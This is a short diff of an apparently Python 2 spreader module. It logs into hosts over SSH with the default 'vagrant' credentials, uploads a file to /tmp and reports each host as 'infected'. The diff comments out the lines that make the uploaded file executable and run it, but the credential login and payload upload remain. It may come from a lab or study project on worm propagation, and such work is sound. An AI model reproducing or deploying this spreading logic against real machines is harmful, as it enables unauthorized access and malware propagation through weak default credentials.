@@ -31,10 +31,10 @@ def run(**args):
             ssh.connect(ipAddr, username="vagrant", password="vagrant")
             sftpClient = ssh.open_sftp()
             sftpClient.put("../" + fileName, "/tmp/" + fileName)
-            ssh.exec_command("chmod a+x /tmp/" + fileName)
+            #ssh.exec_command("chmod +x /tmp/" + fileName)
             print "[+] " + ipAddr + " infected."
-            ssh.exec_command("./tmp/" +fileName)
-            ssh.exec_command("\n")
+            #ssh.exec_command("./tmp/" +fileName)
+            #ssh.exec_command("\n")
         except paramiko.AuthenticationException:
             print "[-] Failed! ..."
 
